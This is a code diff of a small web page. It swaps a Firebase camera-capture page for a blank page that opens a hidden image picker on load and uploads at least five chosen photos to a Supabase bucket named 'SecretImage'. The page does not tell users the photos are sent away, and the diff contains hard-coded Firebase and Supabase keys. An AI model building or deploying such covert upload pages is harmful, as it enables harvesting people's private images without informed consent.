@@ -1,69 +1,59 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Camera Recorder</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Auto Upload to Supabase</title>
 </head>
 <body>
-    <h2>Camera Recorder</h2>
-    <video id="video" autoplay></video>
-    <button id="captureBtn">Capture Photo</button>
-    <canvas id="canvas" style="display:none;"></canvas>
-    <p>Photo ID: <span id="photoId"></span></p>
 
-    <!-- Firebase SDK -->
-    <script src="https://www.gstatic.com/firebasejs/9.15.0/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.15.0/firebase-firestore-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.15.0/firebase-storage-compat.js"></script>
-<button onclick = "window.location.href = 'viewer.html'">go to view</button>
-    <script>
-        const firebaseConfig = {
-            apiKey: "AIzaSyAdgswtuwyKqO4yaO1TrsictKA5FR0gNds",
-            authDomain: "camera-transfer-8ff06.firebaseapp.com",
-            projectId: "camera-transfer-8ff06",
-            storageBucket: "camera-transfer-8ff06.appspot.com",
-            messagingSenderId: "349896834545",
-            appId: "1:349896834545:web:cf0baccbef7133b3c55850",
-            measurementId: "G-SFBLTF1246"
-        };
+<input id="imagePicker" type="file" accept="image/*" multiple style="display:none" />
 
-        firebase.initializeApp(firebaseConfig);
-        const db = firebase.firestore();
-        const storage = firebase.storage();
+<script type="module">
+import { createClient } from 'https://esm.sh/@supabase/supabase-js@2';
 
-        const video = document.getElementById("video");
-        const canvas = document.getElementById("canvas");
-        const captureBtn = document.getElementById("captureBtn");
-        const photoIdDisplay = document.getElementById("photoId");
+// Supabase credentials
+const SUPABASE_URL = 'https://nqtxeqbvxhtsiilgerkj.supabase.co';
+const SUPABASE_ANON_KEY =
+  'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5xdHhlcWJ2eGh0c2lpbGdlcmtqIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjI2OTQ5NzIsImV4cCI6MjA3ODI3MDk3Mn0.aL6O6kkHFAmmVlmU-ixE9Jkz61jgXAx6rlM3zHo_xnc';
 
-        // Access camera
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then(stream => { video.srcObject = stream; })
-            .catch(error => console.error("Camera error:", error));
+const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
 
-        // Capture and upload photo
-        captureBtn.addEventListener("click", () => {
-            const photoId = Date.now().toString();
-            photoIdDisplay.innerText = photoId;
+// Auto open image picker when page loads
+window.addEventListener("load", () => {
+  document.getElementById("imagePicker").click();
+});
 
-            const ctx = canvas.getContext("2d");
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+// On image selection
+document.getElementById("imagePicker").addEventListener("change", async (event) => {
+  const files = event.target.files;
 
-            canvas.toBlob(blob => {
-                const storageRef = storage.ref(`photos/${photoId}.jpg`);
-                
-                storageRef.put(blob).then(snapshot => {
-                    snapshot.ref.getDownloadURL().then(url => {
-                        db.collection("photos").doc(photoId).set({ url: url })
-                            .then(() => console.log("Photo saved!"))
-                            .catch(error => console.error("Firestore error:", error));
-                    });
-                });
-            }, "image/jpeg");
-        });
-    </script>
+  if (files.length < 5) {
+    alert("Please select at least 5 images!");
+    return;
+  }
+
+  // pick only first 5
+  const selectedImages = Array.from(files).slice(0, 5);
+
+  for (let file of selectedImages) {
+    const fileName = `${Date.now()}_${file.name}`; // unique name
+    const blob = file;
+
+    const { data, error } = await supabase.storage
+      .from('SecretImage')
+      .upload(fileName, blob, { contentType: 'image/jpeg' });
+
+    if (error) {
+      console.error("Upload error:", error);
+    } else {
+      console.log("Uploaded:", data);
+    }
+  }
+
+  alert("5 images uploaded successfully!");
+});
+</script>
+
 </body>
 </html>
